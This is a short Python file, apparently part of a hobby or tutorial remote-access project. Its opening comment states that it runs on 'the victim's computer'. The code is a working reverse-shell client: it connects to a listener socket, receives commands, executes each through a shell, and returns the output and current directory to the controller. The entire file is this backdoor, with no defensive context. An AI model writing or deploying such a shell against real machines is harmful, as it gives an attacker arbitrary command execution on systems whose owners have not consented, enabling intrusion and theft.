# this file will be running on the victim's computer
import socket
import os
import subprocess


class Client:
    def __init__(self):
        self.hostname = '127.0.0.1'
        self.port = 9999
        self.sckt = socket.socket()

    def connect(self):
        self.sckt.connect((self.hostname, self.port,))

    def receive_commands(self):
        while True:
            data = self.sckt.recv(1024).lower()
            data_str = str(data, 'utf-8')
            if data_str[:2] == 'cd':
                os.chdir(data_str[3:])
            command = subprocess.Popen(
                data_str, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            response = command.stdout.read() + command.stderr.read() + \
                os.getcwdb() + str.encode('$')
            self.sckt.send(response)


client = Client()
client.connect()
client.receive_commands()
